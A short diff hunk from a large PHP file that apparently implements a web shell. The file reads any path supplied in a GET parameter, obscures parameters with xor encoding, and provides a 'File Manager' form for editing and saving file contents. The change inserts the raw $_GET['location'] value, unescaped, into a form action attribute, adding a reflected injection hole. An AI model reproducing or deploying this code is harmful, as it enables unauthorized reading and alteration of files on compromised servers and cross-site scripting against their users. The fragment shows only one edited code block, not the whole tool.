@@ -2333,7 +2333,7 @@ else if(isset($_GET["file"]))
 		$file = unxor_this(htmlentities($_GET["file"]));
 		$content = file_get_contents(unxor_this($_GET["file"]));
 		echo "
-			<form action='".$_SERVER['PHP_SELF']."?file=".xor_this($file)."#File Manager' method='POST'>
+			<form action='".$_SERVER['PHP_SELF']."?file=".xor_this($file)."&location=".$_GET["location"]."#File Manager' method='POST'>
 				<textarea name='content'>".htmlspecialchars($content)."</textarea><br>
 				<input type='submit' name='save' value='Save' onclick='return xorencr5(this.form, this.form.content);'/>
 			</form>";
